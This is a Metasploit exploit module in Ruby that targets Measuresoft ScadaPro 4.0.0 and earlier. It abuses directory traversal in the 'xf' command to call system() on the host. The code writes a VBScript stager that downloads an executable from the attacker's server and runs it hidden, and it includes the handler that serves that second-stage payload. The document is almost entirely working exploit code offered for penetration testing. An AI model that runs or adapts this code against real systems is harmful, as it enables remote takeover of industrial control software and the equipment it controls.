##
# $Id: scadapro_cmdexe.rb 13737 2011-09-16 08:23:59Z sinn3r $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::HttpServer::HTML
	include Msf::Exploit::Remote::Tcp
	include Msf::Exploit::EXE

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Measuresoft ScadaPro <= 4.0.0 Remote Command Execution',
			'Description'    => %q{
					This module allows remote attackers to execute arbitray commands on 
				the affected system by abusing via Directory Traversal attack when using the 'xf'
				command (execute function). An attacker can execute system() from msvcrt.dll to
				upload a backdoor and gain remote code execution.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'Luigi Auriemma',                           # Initial discovery/poc
					'mr_me <steventhomasseeley[at]gmail.com>',  # msf
					'TecR0c <tecr0c[at]tecninja.net>',          # msf
				],
			'Version'        => '$Revision: 13737 $',
			'References'     =>
				[
					#[ 'CVE', '?'],
					#[ 'OSVDB', '?'],
					[ 'BID', '49613'],
					[ 'URL', 'http://aluigi.altervista.org/adv/scadapro_1-adv.txt'],
					[ 'URL', 'http://us-cert.gov/control_systems/pdf/ICS-ALERT-11-256-04.pdf'],
					# seemed pretty accurate to us ;)
					[ 'URL', 'http://www.measuresoft.net/news/post/Inaccurate-Reports-of-Measuresoft-ScadaPro-400-Vulnerability.aspx'],
				],
			'DefaultOptions' =>
				{
					'InitialAutoRunScript' => 'migrate -f',
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					# truly universal
					[ 'Automatic', { } ],
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Sep 16 2011'))

			register_options(
			[
				Opt::RPORT(11234),
				OptString.new('URIPATH', [ true, "The URI to use.", "/" ]),
			], self.class)
	end

	# couldn't generate a vbs or exe payload and then use the wF command
	# as there is a limit to the amount of data to write to disk.
	# so we just write out a vbs script like the old days.

	def build_vbs(url, stager_name)
		name_xmlhttp = rand_text_alpha(2)
		name_adodb   = rand_text_alpha(2)

		tmp = "#{@temp_folder}/#{stager_name}"

		vbs  = "echo Set #{name_xmlhttp} = CreateObject(\"Microsoft.XMLHTTP\") "
		vbs << ": #{name_xmlhttp}.open \"GET\",\"http://#{url}\",False : #{name_xmlhttp}.send"
		vbs << ": Set #{name_adodb} = CreateObject(\"ADODB.Stream\") "
		vbs << ": #{name_adodb}.Open : #{name_adodb}.Type=1 "
		vbs << ": #{name_adodb}.Write #{name_xmlhttp}.responseBody "
		vbs << ": #{name_adodb}.SaveToFile \"#{@temp_folder}/#{@payload_name}.exe\",2 "
		vbs << ": CreateObject(\"WScript.Shell\").Run \"#{@temp_folder}/#{@payload_name}.exe\",0 >> #{tmp}"

		return vbs
	end

	def on_request_uri(cli, request)
		if request.uri =~ /\.exe/
			print_status("Sending 2nd stage payload to #{cli.peerhost}:#{cli.peerport}...")
			return if ((p=regenerate_payload(cli)) == nil)
			data = generate_payload_exe( {:code=>p.encoded} )
			send_response(cli, data, {'Content-Type' => 'application/octet-stream'} )
			return
		end
	end

	def exploit
		# In order to save binary data to the file system the payload is written to a .vbs
		# file and execute it from there.
		@payload_name = rand_text_alpha(4)
		@temp_folder  = "C:/Windows/Temp"

		if datastore['SRVHOST'] == '0.0.0.0'
			lhost = Rex::Socket.source_address('50.50.50.50')
		else
			lhost = datastore['SRVHOST']
		end

		payload_src  = lhost
		payload_src << ":" << datastore['SRVPORT'] << datastore['URIPATH'] << @payload_name << ".exe"

		stager_name = rand_text_alpha(6) + ".vbs"
		stager      = build_vbs(payload_src, stager_name)

		path = "..\\..\\..\\..\\..\\windows\\system32"

		createvbs = "xf%#{path}\\msvcrt.dll,system,cmd /c #{stager}\r\n"
		download_execute = "xf%#{path}\\msvcrt.dll,system,start #{@temp_folder}/#{stager_name}\r\n"

		print_status("Sending 1st stage payload...")

		connect
		sock.get_once()
		sock.put(createvbs)
		sock.get_once()
		sock.put(download_execute)
		handler()
		disconnect

		super
	end

end
